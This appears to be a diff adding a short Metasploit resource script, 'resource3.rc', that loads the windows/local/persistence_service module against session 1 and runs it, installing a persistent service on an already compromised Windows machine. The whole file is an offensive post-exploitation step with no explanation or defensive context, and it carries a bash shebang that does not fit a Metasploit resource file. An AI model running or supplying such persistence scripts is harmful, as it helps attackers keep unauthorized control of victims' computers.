@@ -1,0 +1,6 @@
+#!/bin/bash
+#resource3.rc
+
+use windows/local/persistence_service
+set SESSION 1
+run
